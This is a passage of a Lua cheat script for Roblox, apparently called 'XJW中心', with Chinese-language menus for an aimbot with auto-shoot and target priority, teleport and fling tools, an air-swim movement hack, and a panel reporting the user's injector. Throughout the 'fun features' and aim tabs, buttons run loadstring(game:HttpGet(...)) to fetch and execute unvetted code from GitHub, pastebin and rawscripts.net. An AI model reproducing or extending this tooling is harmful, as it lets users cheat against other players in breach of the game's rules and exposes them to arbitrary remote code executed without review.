			s.Volume = 2
			s.Parent = game:GetService("SoundService")
			game:GetService("SoundService"):PlayLocalSound(s)
			s.Ended:Connect(function()
				s:Destroy()
			end)
		end)
	end
	local function hook(sg)
		local function add(d)
			if (d:IsA("TextButton") or d:IsA("ImageButton")) and not d:GetAttribute("XJWS") then
				d:SetAttribute("XJWS", true)
				d.MouseButton1Click:Connect(play)
			end
		end
		sg.DescendantAdded:Connect(add)
		for _, v in ipairs(sg:GetDescendants()) do add(v) end
	end
	return { play = play, hook = hook, set = function(v) on = v end }
end)()
pcall(function()
	_XJWSnd.hook(Library.ScreenGui)
end)

local _cnScheme = Library.Scheme
_cnScheme.BackgroundColor = Color3.fromRGB(8, 8, 8)
_cnScheme.MainColor = Color3.fromRGB(14, 14, 14)
_cnScheme.OutlineColor = Color3.fromRGB(40, 40, 40)
pcall(function()
	Library:SetFont(Enum.Font.SourceSans)
	Library:UpdateColorsUsingRegistry()
end)

pcall(function()
	if Library and Library.ScreenGui then
		Library.ScreenGui.Enabled = false
	end
	Library.Toggled = false
end)

local Tabs = {
Announcement = Window:AddTab("公告", "megaphone"),
Main = Window:AddTab("通用", "user"),
TP = Window:AddTab("传送和甩飞", "send"),
Visual = Window:AddTab("视觉", "eye"),
Aim = Window:AddTab("自瞄", "crosshair"),
Function = Window:AddTab("趣味功能", "list"),
}
local InfoBox = Tabs.Announcement:AddLeftGroupbox("信息")
local lp = game.Players.LocalPlayer
do
local avatarFrame = Instance.new("Frame")
avatarFrame.BackgroundTransparency = 1
avatarFrame.Size = UDim2.new(1, 0, 1, 0)
local avatarImage = Instance.new("ImageLabel")
avatarImage.Name = "Avatar"
avatarImage.AnchorPoint = Vector2.new(0.5, 0.5)
avatarImage.Position = UDim2.new(0.5, 0, 0.5, 0)
avatarImage.Size = UDim2.new(0, 96, 0, 96)
avatarImage.BackgroundTransparency = 1
avatarImage.Image = "rbxasset://textures/ui/iconAssetMissing.png"
avatarImage.ScaleType = Enum.ScaleType.Crop
avatarImage.BorderColor3 = Color3.fromRGB(0, 0, 0)
avatarImage.Parent = avatarFrame
task.spawn(function()
local ok, url = pcall(function()
return game:GetService("Players"):GetUserThumbnailAsync(lp.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
end)
if ok and url and url ~= "" and avatarImage and avatarImage.Parent then
avatarImage.Image = url
end
end)
InfoBox:AddUIPassthrough("InfoAvatar", { Instance = avatarFrame, Height = 110 })
end
InfoBox:AddLabel("用户名: " .. lp.Name)
InfoBox:AddLabel("显示名称: " .. lp.DisplayName)
InfoBox:AddLabel("用户ID: " .. lp.UserId)
InfoBox:AddLabel("账户年龄(天): " .. lp.AccountAge)
InfoBox:AddLabel("语言: " .. lp.LocaleId)
local execName = "未知"
pcall(function() execName = identifyexecutor() end)
InfoBox:AddLabel("注入器: " .. execName)
InfoBox:AddLabel("游戏ID: " .. tostring(game.PlaceId))
InfoBox:AddLabel("服务器ID: " .. tostring(game.JobId))
InfoBox:AddLabel("Roblox版本: " .. version())
InfoBox:AddLabel("设备: " .. (game:GetService("UserInputService").TouchEnabled and "移动设备" or "电脑"))

InfoBox:AddButton("复制所有信息", function()
local info = {}
table.insert(info, "=== XJW中心 - 信息 ===")
table.insert(info, "用户名: " .. lp.Name)
table.insert(info, "显示名称: " .. lp.DisplayName)
table.insert(info, "用户ID: " .. lp.UserId)
table.insert(info, "账户年龄(天): " .. lp.AccountAge)
table.insert(info, "注入器: " .. execName)
table.insert(info, "游戏ID: " .. tostring(game.PlaceId))
table.insert(info, "服务器ID: " .. tostring(game.JobId))
table.insert(info, "Roblox版本: " .. version())
table.insert(info, "=== " .. os.date("%Y-%m-%d %H:%M:%S") .. " ===")
pcall(function() setclipboard(table.concat(info, "\n")) end)
pcall(function()
game.StarterGui:SetCore("SendNotification", { Title = "成功", Text = "信息已复制到剪贴板", Duration = 3 })
end)
end)

InfoBox:AddButton("复制服务器ID", function()
pcall(function() setclipboard(tostring(game.JobId)) end)
pcall(function()
game.StarterGui:SetCore("SendNotification", { Title = "成功", Text = "服务器ID已复制到剪贴板", Duration = 3 })
end)
end)

InfoBox:AddButton("重新加入当前服务器", function()
pcall(function()
game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, lp)
end)
end)

InfoBox:AddButton("加入当前人最少的服务器", function()
task.spawn(function()
local http = game:GetService("HttpService")
local teleport = game:GetService("TeleportService")
local starterGui = game:GetService("StarterGui")
local targetJobId = nil
local bestCount = math.huge
local placeId = game.PlaceId
local function notify(text)
pcall(function()
starterGui:SetCore("SendNotification", { Title = "提示", Text = text, Duration = 5 })
end)
end
local baseUrl = "https://games.roblox.com/v1/games/" .. tostring(placeId) .. "/servers/Public?limit=100&sortOrder=Asc"
local cursor = nil
local pagesGot = 0
local candidates = 0
for _ = 1, 10 do
local url = baseUrl
if cursor then
url = baseUrl .. "&cursor=" .. cursor
end
local res = nil
local lastErr = nil
for retry = 1, 3 do
local ok2, r = pcall(function()
return game:HttpGet(url)
end)
if ok2 and r and r ~= "" then
res = r
break
else
lastErr = r
task.wait(1)
end
end
if not res then
notify("无法连接服务器列表，请确认游戏已开启「允许HTTP请求」（设置>安全>允许第三方HTTP请求）")
return
end
local ok3, json = pcall(function()
return http:JSONDecode(res)
end)
if not ok3 or not json or not json.data then
break
end
pagesGot = pagesGot + 1
for _, s in json.data do
if s.id and s.playing and s.maxPlayers and s.playing < s.maxPlayers and s.id ~= game.JobId then
candidates = candidates + 1
if s.playing < bestCount then
bestCount = s.playing
targetJobId = s.id
end
end
end
cursor = json.nextPageCursor
if not cursor or #json.data == 0 then
break
end
task.wait(0.5)
end
if targetJobId then
notify("正在加入最少人服务器（" .. bestCount .. "人）")
task.wait(1)
pcall(function()
teleport:TeleportToPlaceInstance(placeId, targetJobId, lp)
end)
else
if pagesGot == 0 then
notify("服务器列表接口返回空数据，请稍后重试")
else
notify("当前服务器已是人最少的一个，未找到更少人的公开服务器")
end
end
end)
end)

local AnnouncementBox = Tabs.Announcement:AddRightGroupbox("公告")
AnnouncementBox:AddLabel("祝你天天开心，脚本禁止倒卖 ")
AnnouncementBox:AddLabel("作者B站UID: 3706985503525348")
AnnouncementBox:AddLabel("脚本会持续更新，永久免费")
AnnouncementBox:AddLabel("更新时间: " .. _lastUpdate)
AnnouncementBox:AddButton("复制QQ群:735780027", function()
pcall(function() setclipboard("735780027") end)
pcall(function()
game.StarterGui:SetCore("SendNotification", { Title = "成功", Text = "QQ群已复制到剪贴板", Duration = 3 })
end)
end)

do
local plrs = game:GetService("Players")
local me = plrs.LocalPlayer
local run = game:GetService("RunService")
local camera = workspace.CurrentCamera

local AimBox = Tabs.Aim:AddLeftGroupbox("自瞄")
local AimSideBox = Tabs.Aim:AddRightGroupbox("单独自瞄")
AimSideBox:AddLabel({ Text = "如果你感到很卡的话，加载下面的单独自瞄", DoesWrap = true })
AimSideBox:AddButton({ Text = "点击加载单独透视自瞄", Func = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/main/XJW自瞄透视.lua"))()
end })
local AimbotEnabled = false
local LockMode = "普通"
local AimPart = "Head"
local PriorityMode = "准星最近"
local TeamCheck = false
local WallCheck = false
local FOVSize = 150
local Smoothness = 10
local ShowFOV = false
local AutoShoot = false
local PredictionAmount = 0
local RequireWeapon = false
local IncludeNPCs = false
local SpecificTarget = nil
local Blacklist = {}
local aimTarget = nil
local targetVelocity = Vector3.zero
local lastTargetPosition = Vector3.zero
local lastUpdateTime = 0
local aimFOVCircle = nil
local blacklistLabel = nil

local function createAimFOVCircle()
pcall(function()
if aimFOVCircle then aimFOVCircle:Remove() end
end)
local ok, circle = pcall(function()
local c = Drawing.new("Circle")
c.Visible = false
c.Radius = FOVSize
c.Color = Color3.fromRGB(255, 60, 60)
c.Filled = false
c.Thickness = 2
c.NumSides = 80
c.Transparency = 0.6
c.ZIndex = 999
return c
end)
if ok and circle then
aimFOVCircle = circle
end
end
createAimFOVCircle()

local function aimGetCharacter(obj)
if obj:IsA("Player") then
return obj.Character
elseif obj:IsA("Model") then
if obj:FindFirstChild("Humanoid") and obj:FindFirstChild("HumanoidRootPart") then
return obj
end
elseif obj:IsA("BasePart") and obj.Parent then
local model = obj.Parent
if model:IsA("Model") and model:FindFirstChild("Humanoid") then
return model
end
end
return nil
end

local function aimIsSameTeam(obj)
if not obj or not me then return false end
if obj:IsA("Player") then
local ok, result = pcall(function()
return obj.Team and me.Team and obj.Team == me.Team
end)
return ok and result
end
if obj:IsA("Model") or obj:IsA("BasePart") then
local teamColor = obj:FindFirstChild("TeamColor")
if teamColor and me.Team then
return teamColor.Value == me.Team.TeamColor
end
local teamTag = obj:FindFirstChild("Team")
if teamTag and me.Team then
return tostring(teamTag.Value) == tostring(me.Team)
end
end
return false
end

local function aimHasWeapon()
local char = me.Character
if not char then return false end
for _, tool in pairs(char:GetChildren()) do
if tool:IsA("Tool") then
if tool:FindFirstChild("Handle") then
if tool:FindFirstChild("Ammo") or tool:FindFirstChild("Magazine") or
tool:FindFirstChild("FireMode") or tool:FindFirstChild("Bullets") or
tool:FindFirstChild("Damage") or tool:FindFirstChild("MaxAmmo") or
tool.ClassName == "Tool" then
return true
end
end
end
end
return false
end

local function aimIsPartVisible(part)
if not part then return false end
local localCharacter = me.Character
if not localCharacter then return false end
local origin = camera.CFrame.Position
local direction = part.Position - origin
local distance = direction.Magnitude
if distance <= 0 then return false end
local raycastParams = RaycastParams.new()
raycastParams.FilterType = Enum.RaycastFilterType.Exclude
local descendants = {}
if localCharacter then
for _, v in ipairs(localCharacter:GetDescendants()) do
if v:IsA("BasePart") then
table.insert(descendants, v)
end
end
end
if part.Parent then
for _, v in ipairs(part.Parent:GetDescendants()) do
if v:IsA("BasePart") then
table.insert(descendants, v)
end
end
end
raycastParams.FilterDescendantsInstances = descendants
local raycastResult = workspace:Raycast(origin, direction.Unit * distance, raycastParams)
return raycastResult == nil
end

local function aimGetNPCs()
local npcs = {}
for _, obj in ipairs(workspace:GetDescendants()) do
if obj:IsA("Model") and obj ~= me.Character then
local humanoid = obj:FindFirstChildOfClass("Humanoid")
local rootPart = obj:FindFirstChild("HumanoidRootPart")
if humanoid and rootPart and humanoid.Health > 0 then
local isPlayerChar = false
for _, plr in ipairs(plrs:GetPlayers()) do
if plr.Character == obj then
isPlayerChar = true
break
end
end
if not isPlayerChar then
table.insert(npcs, obj)
end
end
end
end
return npcs
end

local function aimGetTargetPart(target)
if not target then return nil end
local char = aimGetCharacter(target)
if not char then return nil end
local part = char:FindFirstChild(AimPart)
if not part then
part = char:FindFirstChild("Head")
end
if not part then
part = char:FindFirstChild("HumanoidRootPart")
end
return part
end

local function aimPredictPosition(target, part)
if not target or not part then
if part then return part.Position end
return Vector3.zero
end
local velocity = Vector3.zero
if part:IsA("BasePart") then
velocity = part.Velocity
elseif part.Velocity then
velocity = part.Velocity
end
if velocity.Magnitude == 0 then
local char = aimGetCharacter(target)
if char then
local rootPart = char:FindFirstChild("HumanoidRootPart")
if rootPart and rootPart:IsA("BasePart") then
velocity = rootPart.Velocity
end
end
end
local predictedPosition = part.Position + (velocity * PredictionAmount)
local currentTime = tick()
if currentTime - lastUpdateTime > 0.05 then
targetVelocity = (part.Position - lastTargetPosition) / (currentTime - lastUpdateTime)
lastTargetPosition = part.Position
lastUpdateTime = currentTime
end
return predictedPosition
end

AimBox:AddToggle("AimBot", { Text = "自瞄", Default = false }):OnChanged(function(Value)
AimbotEnabled = Value
if not Value then
aimTarget = nil
if aimFOVCircle then
aimFOVCircle.Visible = ShowFOV
end
end
end)
AimBox:AddToggle("AimShowFOV", { Text = "显示FOV圈", Default = false }):OnChanged(function(Value)
ShowFOV = Value
end)
AimBox:AddToggle("AimTeamCheck", { Text = "队伍判断", Default = false }):OnChanged(function(Value)
TeamCheck = Value
end)
AimBox:AddToggle("AimWallCheck", { Text = "墙壁检查", Default = false }):OnChanged(function(Value)
WallCheck = Value
end)
AimBox:AddToggle("AimAutoShoot", { Text = "自动开枪", Default = false }):OnChanged(function(Value)
AutoShoot = Value
end)
AimBox:AddToggle("AimRequireWeapon", { Text = "手持武器自瞄", Default = false }):OnChanged(function(Value)
RequireWeapon = Value
end)
AimBox:AddToggle("AimIncludeNPCs", { Text = "包含NPC/Bot", Default = false }):OnChanged(function(Value)
IncludeNPCs = Value
end)

AimBox:AddDropdown("AimLockMode", { Text = "锁定模式", Values = { "普通", "强锁", "平滑" }, Default = "普通" }):OnChanged(function(v)
LockMode = v
end)
AimBox:AddDropdown("AimPart", { Text = "瞄准部位", Values = { "Head", "HumanoidRootPart", "UpperTorso", "LowerTorso" }, Default = "Head" }):OnChanged(function(v)
AimPart = v
end)
AimBox:AddDropdown("AimPriority", { Text = "优先模式", Values = { "准星最近", "距离最近", "血量最低" }, Default = "准星最近" }):OnChanged(function(v)
PriorityMode = v
end)

AimBox:AddSlider("AimFOV", { Text = "FOV大小", Min = 50, Max = 500, Default = 150 }):OnChanged(function(Value)
FOVSize = math.floor(Value)
if aimFOVCircle then
aimFOVCircle.Radius = FOVSize
end
end)
AimBox:AddSlider("AimSmoothness", { Text = "平滑度", Min = 1, Max = 30, Default = 10 }):OnChanged(function(Value)
Smoothness = math.floor(Value)
end)
AimBox:AddSlider("AimPrediction", { Text = "预判量", Min = 0, Max = 5, Default = 0 }):OnChanged(function(Value)
PredictionAmount = Value
end)

local specificAimInput = AimBox:AddInput("AimSpecific", { Text = "特定目标", Default = "" })
specificAimInput:OnChanged(function(text)
if text and text ~= "" then
SpecificTarget = text
else
SpecificTarget = nil
end
end)
AimBox:AddButton("清除特定目标", function()
SpecificTarget = nil
pcall(function() specificAimInput:SetValue("") end)
end)

local blacklistInput = AimBox:AddInput("AimBlacklistAdd", { Text = "黑名单名字", Default = "" })
local blacklistInputVal = ""
blacklistInput:OnChanged(function(text)
blacklistInputVal = text or ""
end)
blacklistLabel = AimBox:AddLabel("黑名单: 无")
local function refreshBlacklistLabel()
if blacklistLabel then
if #Blacklist == 0 then
pcall(function() blacklistLabel:SetText("黑名单: 无") end)
else
pcall(function() blacklistLabel:SetText("黑名单: " .. table.concat(Blacklist, "、")) end)
end
end
end
AimBox:AddButton("添加黑名单", function()
local name = blacklistInputVal
if name and name ~= "" then
local found = false
for _, v in ipairs(Blacklist) do
if v == name then
found = true
break
end
end
if not found then
table.insert(Blacklist, name)
refreshBlacklistLabel()
pcall(function() blacklistInput:SetValue("") end)
blacklistInputVal = ""
end
end
end)
AimBox:AddButton("清空黑名单", function()
Blacklist = {}
refreshBlacklistLabel()
end)

run.RenderStepped:Connect(function(deltaTime)
local center = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)

pcall(function()
if not aimFOVCircle then
createAimFOVCircle()
end
if aimFOVCircle then
aimFOVCircle.Position = center
aimFOVCircle.Radius = FOVSize
aimFOVCircle.Visible = ShowFOV and AimbotEnabled
end
end)

if not AimbotEnabled then
aimTarget = nil
if aimFOVCircle then
aimFOVCircle.Color = Color3.fromRGB(255, 60, 60)
aimFOVCircle.Visible = ShowFOV
end
return
end

if RequireWeapon and not aimHasWeapon() then
aimTarget = nil
if aimFOVCircle then
aimFOVCircle.Color = Color3.fromRGB(255, 60, 60)
aimFOVCircle.Visible = ShowFOV
end
return
end

local localChar = me.Character
if not localChar or not localChar:FindFirstChild("HumanoidRootPart") then
aimTarget = nil
if aimFOVCircle then
aimFOVCircle.Color = Color3.fromRGB(255, 60, 60)
aimFOVCircle.Visible = ShowFOV
end
return
end

local targets = {}
local myRoot = localChar.HumanoidRootPart

local blSet = {}
for _, name in ipairs(Blacklist) do blSet[name] = true end
for _, plr in ipairs(plrs:GetPlayers()) do
local ok = true
if plr == me then ok = false end
local isBlacklisted = blSet[plr.Name] or blSet[plr.DisplayName]
if isBlacklisted then ok = false end
if SpecificTarget and plr.Name ~= SpecificTarget and plr.DisplayName ~= SpecificTarget then ok = false end
if TeamCheck and aimIsSameTeam(plr) then ok = false end
local char = plr.Character
if not char then ok = false end
local hum = char and char:FindFirstChildOfClass("Humanoid")
if not hum or hum.Health <= 0 then ok = false end
local part = aimGetTargetPart(plr)
if not part then ok = false end
if WallCheck and not aimIsPartVisible(part) then ok = false end
local predictedPos = aimPredictPosition(plr, part)
local sp, on = camera:WorldToViewportPoint(predictedPos)
if not on then ok = false end
if ok then
local sd = (Vector2.new(sp.X, sp.Y) - center).Magnitude
if sd <= FOVSize then
local wd = (myRoot.Position - part.Position).Magnitude
table.insert(targets, { target = plr, part = part, sd = sd, wd = wd, hp = hum.Health, predictedPos = predictedPos })
end
end
end

if IncludeNPCs then
local npcs = aimGetNPCs()
for _, npc in ipairs(npcs) do
local hum = npc:FindFirstChildOfClass("Humanoid")
if hum and hum.Health > 0 then
local part = aimGetTargetPart(npc)
if part then
if not (WallCheck and not aimIsPartVisible(part)) then
local predictedPos = aimPredictPosition(npc, part)
local sp, on = camera:WorldToViewportPoint(predictedPos)
if on then
local sd = (Vector2.new(sp.X, sp.Y) - center).Magnitude
if sd <= FOVSize then
local wd = (myRoot.Position - part.Position).Magnitude
table.insert(targets, { target = npc, part = part, sd = sd, wd = wd, hp = hum.Health, predictedPos = predictedPos })
end
end
end
end
end
end
end

if #targets == 0 then
if aimFOVCircle then
aimFOVCircle.Color = Color3.fromRGB(255, 60, 60)
aimFOVCircle.Visible = ShowFOV
end
aimTarget = nil
return
end

table.sort(targets, function(a, b)
if PriorityMode == "距离最近" then
return a.wd < b.wd
elseif PriorityMode == "血量最低" then
return a.hp < b.hp
else
return a.sd < b.sd
end
end)

local t = targets[1]
aimTarget = t.target

if aimFOVCircle then
aimFOVCircle.Color = Color3.fromRGB(100, 255, 100)
aimFOVCircle.Visible = ShowFOV
end

local targetPosition = t.predictedPos or t.part.Position

if LockMode == "强锁" then
camera.CFrame = CFrame.new(camera.CFrame.Position, targetPosition)
elseif LockMode == "平滑" then
local targetCF = CFrame.new(camera.CFrame.Position, targetPosition)
local smoothFactor = math.min(1, deltaTime * 10)
camera.CFrame = camera.CFrame:Lerp(targetCF, smoothFactor)
else
local targetCF = CFrame.new(camera.CFrame.Position, targetPosition)
local smoothValue = 1 / Smoothness
if targetVelocity.Magnitude > 10 then
smoothValue = math.min(0.5, smoothValue * 0.8)
end
camera.CFrame = camera.CFrame:Lerp(targetCF, smoothValue)
end

if AutoShoot and aimTarget then
pcall(function()
if localChar then
for _, tool in pairs(localChar:GetChildren()) do
if tool:IsA("Tool") then
if tool:FindFirstChild("Activate") then
local handle = tool:FindFirstChild("Handle")
if handle and handle:IsA("BasePart") then
local distance = (handle.Position - targetPosition).Magnitude
if distance < 1000 then
tool:Activate()
end
end
end
end
end
end
end)
end
end)

end

local FeatureBox = Tabs.Function:AddLeftGroupbox("其他")
FeatureBox:AddButton("静默甩飞", function()
safeLoad("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E9%9D%99%E9%BB%98%E7%94%A9%E9%A3%9E(%E5%BC%80%E6%BA%90).lua")
end)
FeatureBox:AddButton("祖国人汉化", function()
safeLoad("https://raw.githubusercontent.com/kongbaNB/-/refs/heads/main/%E7%A5%96%E5%9B%BD%E4%BA%BA%E6%B1%89%E5%8C%96")
end)
FeatureBox:AddButton("无敌少侠飞行r15", function()
local ok, err = pcall(function()
safeLoad("https://raw.githubusercontent.com/396abc/Script/refs/heads/main/MobileFly.lua")
end)
if not ok then
game.StarterGui:SetCore("SendNotification", {Title = "加载失败", Text = tostring(err):sub(1, 100), Duration = 5})
end
end)
FeatureBox:AddButton("缓慢快速跑", function()
loadstring(game:HttpGet("https://pastebin.com/raw/7fLqezjn"))()
end)
FeatureBox:AddButton("蜗牛V2", function()
loadstring(game:HttpGet("https://pastebin.com/raw/1PvSFyZ4"))()
end)
FeatureBox:AddButton("SCP096", function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-SCP-096-36948"))()
end)
FeatureBox:AddButton("时光回溯", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%97%B6%E5%85%89%E5%9B%9E%E6%BA%AF.lua"))()
end)
FeatureBox:AddButton("死亡笔记", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0.lua"))()
end)
FeatureBox:AddButton("更帅的超人式飞行", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%9B%B4%E5%B8%85%E7%9A%84%E8%B6%85%E4%BA%BA%E5%BC%8F%E9%A3%9E%E8%A1%8C.lua"))()
end)
local FeatureBoxR = Tabs.Function:AddRightGroupbox("其他")
FeatureBoxR:AddButton("摄像机穿墙", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%91%84%E5%83%8F%E6%9C%BA%E7%A9%BF%E5%A2%99.lua"))()
end)
FeatureBoxR:AddButton("逆转疾跑", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E9%80%86%E8%BD%AC%E7%96%BE%E8%B7%91.lua"))()
end)
FeatureBoxR:AddButton("死亡笔记V2", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0V2.lua"))()
end)
FeatureBoxR:AddButton("星光特效", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/91917878/refs/heads/main/%E6%98%9F%E5%85%89%E7%89%B9%E6%95%88.lua"))()
end)
FeatureBoxR:AddButton("踏空行走", function()
pcall(function()
safeLoad('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float')
end)
Notify("踏空行走", "踏空行走脚本已加载", 3)
end)
local airSwimEnabled = false
local airSwimConns = {}
local airSwimBV = nil
local airSwimBG = nil

FeatureBoxR:AddToggle("AirSwimToggle", {
Text    = "空中游泳",
Default = false,
}):OnChanged(function(state)
airSwimEnabled = state
local speaker = game:GetService("Players").LocalPlayer
if state then

local char = speaker.Character
if not char then return end
local hum = char:FindFirstChildOfClass("Humanoid")
local root = char:FindFirstChild("HumanoidRootPart")
if not hum or not root then return end

local states = {
Enum.HumanoidStateType.Climbing,
Enum.HumanoidStateType.FallingDown,
Enum.HumanoidStateType.Flying,
Enum.HumanoidStateType.Freefall,
Enum.HumanoidStateType.GettingUp,
Enum.HumanoidStateType.Jumping,
Enum.HumanoidStateType.Landed,
Enum.HumanoidStateType.Physics,
Enum.HumanoidStateType.PlatformStanding,
Enum.HumanoidStateType.Ragdoll,
Enum.HumanoidStateType.Running,
Enum.HumanoidStateType.RunningNoPhysics,
Enum.HumanoidStateType.Seated,
Enum.HumanoidStateType.StrafingNoPhysics,
Enum.HumanoidStateType.Swimming,
}
for _, s in ipairs(states) do
hum:SetStateEnabled(s, false)
end
hum:ChangeState(Enum.HumanoidStateType.Swimming)

local swimControl = {
enabled = true,
speed = 25,
moving = { forward = false, backward = false, left = false, right = false, up = false, down = false }
}

airSwimBV = Instance.new("BodyVelocity")
airSwimBV.Name = "SwimBodyVelocity"
airSwimBV.Parent = root
airSwimBV.MaxForce = Vector3.new(4000, 4000, 4000)
airSwimBV.Velocity = Vector3.new(0, 0, 0)

airSwimBG = Instance.new("BodyGyro")
airSwimBG.Name = "SwimBodyGyro"
airSwimBG.Parent = root
airSwimBG.MaxTorque = Vector3.new(2000, 2000, 2000)
airSwimBG.D = 500
airSwimBG.P = 8000

local UIS = game:GetService("UserInputService")
airSwimConns.inputBegin = UIS.InputBegan:Connect(function(input, processed)
if processed then return end
if input.KeyCode == Enum.KeyCode.W then swimControl.moving.forward = true
elseif input.KeyCode == Enum.KeyCode.S then swimControl.moving.backward = true
elseif input.KeyCode == Enum.KeyCode.A then swimControl.moving.left = true
elseif input.KeyCode == Enum.KeyCode.D then swimControl.moving.right = true
elseif input.KeyCode == Enum.KeyCode.Space then swimControl.moving.up = true
elseif input.KeyCode == Enum.KeyCode.LeftControl or input.KeyCode == Enum.KeyCode.LeftShift then swimControl.moving.down = true
end
end)

airSwimConns.inputEnd = UIS.InputEnded:Connect(function(input, processed)
if processed then return end
if input.KeyCode == Enum.KeyCode.W then swimControl.moving.forward = false
elseif input.KeyCode == Enum.KeyCode.S then swimControl.moving.backward = false
elseif input.KeyCode == Enum.KeyCode.A then swimControl.moving.left = false
elseif input.KeyCode == Enum.KeyCode.D then swimControl.moving.right = false
elseif input.KeyCode == Enum.KeyCode.Space then swimControl.moving.up = false
elseif input.KeyCode == Enum.KeyCode.LeftControl or input.KeyCode == Enum.KeyCode.LeftShift then swimControl.moving.down = false
end
end)

airSwimConns.heartbeat = RunService.Heartbeat:Connect(function()
if not swimControl.enabled then return end
local moveDir = Vector3.new(0, 0, 0)
if swimControl.moving.forward then moveDir = moveDir + workspace.CurrentCamera.CFrame.LookVector end
if swimControl.moving.backward then moveDir = moveDir - workspace.CurrentCamera.CFrame.LookVector end
if swimControl.moving.left then moveDir = moveDir - workspace.CurrentCamera.CFrame.RightVector end
if swimControl.moving.right then moveDir = moveDir + workspace.CurrentCamera.CFrame.RightVector end
if swimControl.moving.up then moveDir = moveDir + Vector3.new(0, 1, 0) end
if swimControl.moving.down then moveDir = moveDir + Vector3.new(0, -1, 0) end
if moveDir.Magnitude > 0 then
airSwimBV.Velocity = moveDir.Unit * swimControl.speed
else
airSwimBV.Velocity = Vector3.new(0, 0, 0)
end
airSwimBG.CFrame = CFrame.new(root.Position, root.Position + workspace.CurrentCamera.CFrame.LookVector)
end)

airSwimConns.charAdded = speaker.CharacterAdded:Connect(function(newChar)
task.wait(0.7)
local newHum = newChar:FindFirstChildOfClass("Humanoid")
if newHum then
for _, s in ipairs(states) do
newHum:SetStateEnabled(s, false)
end
newHum:ChangeState(Enum.HumanoidStateType.Swimming)
end
if swimControl.enabled then
local newRoot = newChar:WaitForChild("HumanoidRootPart")
if airSwimBV then airSwimBV:Destroy() end
if airSwimBG then airSwimBG:Destroy() end
airSwimBV = Instance.new("BodyVelocity")
airSwimBV.Name = "SwimBodyVelocity"
airSwimBV.Parent = newRoot
airSwimBV.MaxForce = Vector3.new(4000, 4000, 4000)
airSwimBV.Velocity = Vector3.new(0, 0, 0)
airSwimBG = Instance.new("BodyGyro")
airSwimBG.Name = "SwimBodyGyro"
airSwimBG.Parent = newRoot
airSwimBG.MaxTorque = Vector3.new(2000, 2000, 2000)
airSwimBG.D = 500
airSwimBG.P = 8000
end
end)

pcall(function() Notify("空中游泳", "空中游泳已开启 - 可在空中自由移动", 3) end)
else

local char = speaker.Character
if char then
local hum = char:FindFirstChildOfClass("Humanoid")
if hum then
local states = {
Enum.HumanoidStateType.Climbing, Enum.HumanoidStateType.FallingDown,
Enum.HumanoidStateType.Flying, Enum.HumanoidStateType.Freefall,
Enum.HumanoidStateType.GettingUp, Enum.HumanoidStateType.Jumping,
Enum.HumanoidStateType.Landed, Enum.HumanoidStateType.Physics,
Enum.HumanoidStateType.PlatformStanding, Enum.HumanoidStateType.Ragdoll,
Enum.HumanoidStateType.Running, Enum.HumanoidStateType.RunningNoPhysics,
Enum.HumanoidStateType.Seated, Enum.HumanoidStateType.StrafingNoPhysics,
Enum.HumanoidStateType.Swimming,
}
for _, s in ipairs(states) do
hum:SetStateEnabled(s, true)
end
hum:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
end
end

for name, conn in pairs(airSwimConns) do
if typeof(conn) == "RBXScriptConnection" then
conn:Disconnect()
airSwimConns[name] = nil
end
end
if airSwimBV then airSwimBV:Destroy() airSwimBV = nil end
if airSwimBG then airSwimBG:Destroy() airSwimBG = nil end
pcall(function() Notify("空中游泳", "空中游泳已关闭", 3) end)
end
end)

local PPlayers = game:GetService("Players")
local PLocalPlayer = PPlayers.LocalPlayer
local PRunService = game:GetService("RunService")

local function pNotify(title, text)
pcall(function()
game.StarterGui:SetCore("SendNotification", { Title = title, Text = text, Duration = 3 })
end)
end

local function getLocalChar()
return PLocalPlayer.Character
end

local function getTargetPlayer(name)
for _, p in ipairs(PPlayers:GetPlayers()) do
if p.Name == name or p.DisplayName == name then return p end
end
return nil
end

local function disableCollision(char)
if not char then return end
for _, part in ipairs(char:GetDescendants()) do
if part:IsA("BasePart") then part.CanCollide = false end
end
end

local function enableCollision(char)
if not char then return end
for _, part in ipairs(char:GetDescendants()) do
if part:IsA("BasePart") then part.CanCollide = true end
end
end

local PState = { conns = {}, threads = {} }
local function stopAllConns()
for name, conn in pairs(PState.conns) do
if typeof(conn) == "RBXScriptConnection" then
conn:Disconnect()
PState.conns[name] = nil
end
end
for _, thread in ipairs(PState.threads) do
if thread then task.cancel(thread) end
end
PState.threads = {}
end

local function refreshPlayerNames()
local names = {}
for _, p in ipairs(PPlayers:GetPlayers()) do
if p ~= PLocalPlayer then table.insert(names, p.Name) end
end
table.sort(names)
return names
end

local TeleportBox = Tabs.TP:AddLeftGroupbox("传送功能")
local tpTargetName = ""
local tpDropdown = TeleportBox:AddDropdown("TP2_Target", {
Text = "选择目标玩家",
Values = {},
Default = "",
Multi = false,
})
tpDropdown:OnChanged(function(v) tpTargetName = v end)

TeleportBox:AddButton("刷新玩家列表", function()
tpDropdown:SetValues(refreshPlayerNames())
pNotify("刷新", "已刷新玩家列表")
end)

TeleportBox:AddButton("传送到选定玩家", function()
if tpTargetName == "" then pNotify("提示", "请先选择玩家") return end
local target = getTargetPlayer(tpTargetName)
if not target or not target.Character then pNotify("失败", "目标不存在") return end
